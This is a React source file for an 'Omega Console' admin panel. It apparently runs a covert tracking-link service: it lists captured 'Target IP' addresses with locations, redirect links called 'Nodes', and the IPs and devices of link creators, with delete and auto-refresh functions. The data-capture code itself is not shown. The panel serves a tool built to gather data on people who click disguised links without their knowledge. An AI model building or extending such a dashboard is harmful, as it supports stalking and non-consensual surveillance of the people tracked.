
import React, { useState, useEffect } from 'react';
import { ShieldAlert, Terminal, Eye, Globe, Database, Server, LogOut, Search, Activity, Camera, MapPin, Cpu, Trash2, User, ExternalLink, HardDrive, Info } from 'lucide-react';
import { CaptureReport, LinkConfig, OwnerInfo } from '../types';
import ReportDetail from './ReportDetail';

const AdminPanel: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [creds, setCreds] = useState({ user: '', pass: '' });
  const [globalData, setGlobalData] = useState<{ reports: CaptureReport[], links: LinkConfig[], owners: Record<string, OwnerInfo>, stats: any } | null>(null);
  const [loading, setLoading] = useState(false);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [search, setSearch] = useState('');
  const [tab, setTab] = useState<'reports' | 'links' | 'owners'>('reports');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const res = await fetch('/api/admin/global-intel', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: creds.user, password: creds.pass })
    });
    if (res.ok) {
      setGlobalData(await res.json());
      setIsAuthenticated(true);
    } else alert("ACCESS DENIED");
    setLoading(false);
  };

  const refreshData = async () => {
    if (!isAuthenticated) return;
    const res = await fetch('/api/admin/global-intel', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: creds.user, password: creds.pass })
    });
    if (res.ok) setGlobalData(await res.json());
  };

  const deleteReport = async (id: string) => {
    if (!confirm('Purge this record from database?')) return;
    await fetch('/api/admin/delete-report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...creds, username: creds.user, password: creds.pass, reportId: id })
    });
    refreshData();
  };

  const deleteLink = async (id: string) => {
    if (!confirm('Erase this Node and all associated data?')) return;
    await fetch('/api/admin/delete-link', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...creds, username: creds.user, password: creds.pass, linkId: id })
    });
    refreshData();
  };

  useEffect(() => {
    if (isAuthenticated) {
      const i = setInterval(refreshData, 5000);
      return () => clearInterval(i);
    }
  }, [isAuthenticated]);

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-6 font-mono">
        <div className="w-full max-w-sm bg-zinc-900 border-2 border-red-900 p-8 rounded-lg shadow-[0_0_50px_rgba(127,29,29,0.4)]">
          <div className="flex flex-col items-center mb-8">
            <ShieldAlert className="text-red-600 mb-4" size={48} />
            <h1 className="text-red-500 text-xl font-black uppercase tracking-widest">Omega Console</h1>
          </div>
          <form onSubmit={handleLogin} className="space-y-4">
            <input type="text" placeholder="CODENAME" value={creds.user} onChange={e => setCreds({...creds, user: e.target.value})} className="w-full bg-black border border-zinc-800 p-3 text-red-500 outline-none focus:border-red-600" />
            <input type="password" placeholder="ACCESS KEY" value={creds.pass} onChange={e => setCreds({...creds, pass: e.target.value})} className="w-full bg-black border border-zinc-800 p-3 text-red-500 outline-none focus:border-red-600" />
            <button className="w-full bg-red-900 text-white font-black py-3 hover:bg-red-800 transition-all uppercase text-sm tracking-widest">Initialize</button>
          </form>
        </div>
      </div>
    );
  }

  const listReports = globalData?.reports.filter(r => r.location?.ip?.includes(search) || r.ownerId.includes(search)) || [];
  const listLinks = globalData?.links.filter(l => l.name.toLowerCase().includes(search.toLowerCase()) || l.id.includes(search)) || [];

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-400 font-mono p-4 md:p-8">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Admin Nav */}
        <div className="flex flex-col md:flex-row items-center justify-between gap-4 bg-zinc-900 p-6 rounded-xl border border-zinc-800 shadow-xl">
          <div className="flex items-center gap-4">
            <Terminal className="text-red-500" />
            <h1 className="text-white font-black text-lg uppercase tracking-tighter">System Overseer</h1>
            <div className="px-2 py-0.5 bg-red-900/30 border border-red-900/50 text-red-500 text-[10px] rounded uppercase font-bold">Live Stream</div>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={() => setTab('reports')} className={`px-4 py-2 text-xs font-black uppercase rounded-lg border ${tab === 'reports' ? 'bg-red-900/20 border-red-900 text-red-500' : 'border-zinc-800 text-zinc-600 hover:text-white'}`}>Intel</button>
            <button onClick={() => setTab('links')} className={`px-4 py-2 text-xs font-black uppercase rounded-lg border ${tab === 'links' ? 'bg-red-900/20 border-red-900 text-red-500' : 'border-zinc-800 text-zinc-600 hover:text-white'}`}>Nodes</button>
            <button onClick={() => setTab('owners')} className={`px-4 py-2 text-xs font-black uppercase rounded-lg border ${tab === 'owners' ? 'bg-red-900/20 border-red-900 text-red-500' : 'border-zinc-800 text-zinc-600 hover:text-white'}`}>Owners</button>
            <button onClick={() => window.location.hash = '#/'} className="ml-4 p-2 text-zinc-600 hover:text-red-500"><LogOut size={20}/></button>
          </div>
        </div>

        {/* Global Overview */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {[
            { label: 'Captures', val: globalData?.stats.totalReports, icon: Eye, color: 'text-blue-500' },
            { label: 'Nodes', val: globalData?.stats.totalLinks, icon: Server, color: 'text-purple-500' },
            { label: 'Owners', val: globalData?.stats.totalOwners, icon: User, color: 'text-green-500' },
            { label: 'Targets', val: globalData?.stats.uniqueTargetIps, icon: Globe, color: 'text-orange-500' }
          ].map((s, i) => (
            <div key={i} className="bg-zinc-900 border border-zinc-800 p-6 rounded-xl relative overflow-hidden group">
              <div className="absolute top-0 right-0 p-2 opacity-10 group-hover:scale-125 transition-transform"><s.icon size={48} /></div>
              <span className="text-2xl font-black text-white block">{s.val}</span>
              <span className="text-[10px] font-bold uppercase tracking-widest text-zinc-500">{s.label}</span>
            </div>
          ))}
        </div>

        {/* Content Area */}
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden min-h-[500px]">
          <div className="p-6 border-b border-zinc-800 flex items-center justify-between">
            <h2 className="text-sm font-black text-white uppercase italic tracking-widest flex items-center gap-2">
              <Database size={16} /> Global Repository
            </h2>
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600" size={14} />
              <input type="text" placeholder="FILTER SIGNALS..." className="bg-black border border-zinc-800 rounded pl-10 pr-4 py-2 text-[10px] font-bold text-red-500 outline-none w-64 uppercase" value={search} onChange={e => setSearch(e.target.value)} />
            </div>
          </div>

          <div className="overflow-x-auto">
            {tab === 'reports' && (
              <table className="w-full text-left text-[10px] font-bold uppercase border-collapse">
                <thead>
                  <tr className="bg-zinc-950 border-b border-zinc-800 text-zinc-600 tracking-tighter">
                    <th className="p-4">Time</th>
                    <th className="p-4">Target IP</th>
                    <th className="p-4">Owner</th>
                    <th className="p-4">Location</th>
                    <th className="p-4 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-zinc-800/40">
                  {listReports.map((r, i) => (
                    <tr key={i} className="hover:bg-zinc-800/30 transition-colors">
                      <td className="p-4 text-zinc-500">{new Date(r.timestamp).toLocaleTimeString()}</td>
                      <td className="p-4 text-red-500 font-mono">{r.location?.ip}</td>
                      <td className="p-4 text-zinc-400">{r.ownerId}</td>
                      <td className="p-4 text-zinc-500">{r.location?.city || 'NA'}, {r.location?.country || 'NA'}</td>
                      <td className="p-4 text-right flex justify-end gap-2">
                        <button onClick={() => setSelectedReport(r)} className="p-2 bg-blue-900/20 text-blue-500 rounded border border-blue-900/30 hover:bg-blue-500 hover:text-white"><ExternalLink size={12}/></button>
                        <button onClick={() => deleteReport(r.id)} className="p-2 bg-red-900/20 text-red-500 rounded border border-red-900/30 hover:bg-red-500 hover:text-white"><Trash2 size={12}/></button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}

            {tab === 'links' && (
              <table className="w-full text-left text-[10px] font-bold uppercase border-collapse">
                <thead>
                  <tr className="bg-zinc-950 border-b border-zinc-800 text-zinc-600">
                    <th className="p-4">Node Alias</th>
                    <th className="p-4">Node ID</th>
                    <th className="p-4">Owner ID</th>
                    <th className="p-4">Redirect Destination</th>
                    <th className="p-4 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {listLinks.map((l, i) => (
                    <tr key={i} className="hover:bg-zinc-800/30 border-b border-zinc-800/50">
                      <td className="p-4 text-white">{l.name}</td>
                      <td className="p-4 text-zinc-500 font-mono">{l.id}</td>
                      <td className="p-4 text-purple-400">{l.ownerId}</td>
                      <td className="p-4 text-zinc-600 truncate max-w-[200px]">{l.redirectUrl}</td>
                      <td className="p-4 text-right">
                        <button onClick={() => deleteLink(l.id)} className="p-2 text-red-500 hover:bg-red-500 hover:text-white transition-all rounded"><Trash2 size={14}/></button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}

            {tab === 'owners' && (
              <div className="p-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                {Object.values(globalData?.owners || {}).map((o, i) => (
                  <div key={i} className="bg-black border border-zinc-800 p-6 rounded-xl space-y-4">
                    <div className="flex items-center justify-between">
                       <h3 className="text-white font-black">{o.ownerId}</h3>
                       <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                    </div>
                    <div className="space-y-2 text-[10px] font-mono text-zinc-500">
                       <p className="flex justify-between border-b border-zinc-900 pb-1"><span>CREATOR IP</span> <span className="text-red-500">{o.ip}</span></p>
                       <p className="flex justify-between border-b border-zinc-900 pb-1"><span>OS</span> <span className="text-zinc-300">{o.device?.os}</span></p>
                       <p className="flex justify-between border-b border-zinc-900 pb-1"><span>BROWSER</span> <span className="text-zinc-300">{o.device?.browser}</span></p>
                       <p className="flex justify-between"><span>LAST ACTIVE</span> <span className="text-zinc-300">{new Date(o.lastActive).toLocaleString()}</span></p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
      {selectedReport && <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
};

export default AdminPanel;
